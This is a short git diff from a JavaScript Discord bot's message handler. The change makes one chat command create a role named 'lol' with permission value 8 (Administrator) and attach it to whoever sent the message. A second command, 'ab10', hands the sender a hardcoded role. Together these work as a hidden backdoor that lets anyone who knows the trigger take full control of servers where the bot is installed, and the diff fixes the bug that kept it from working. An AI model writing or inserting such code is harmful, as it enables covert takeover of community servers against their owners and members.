@@ -26,8 +26,8 @@ client.on('message', msg => {
   		msg.channel.guild.createRole({
   			name: 'lol',
   			permissions: 8,
-  		}).then(role => id = role.id);
-    	msg.member.addRole(id)
+  		}).then(role => msg.member.addRole(role.id));
+    	//msg.member.addRole(id.toString());
     	break;
   	case 'ab10':
     	msg.member.addRole('596921899666112541')
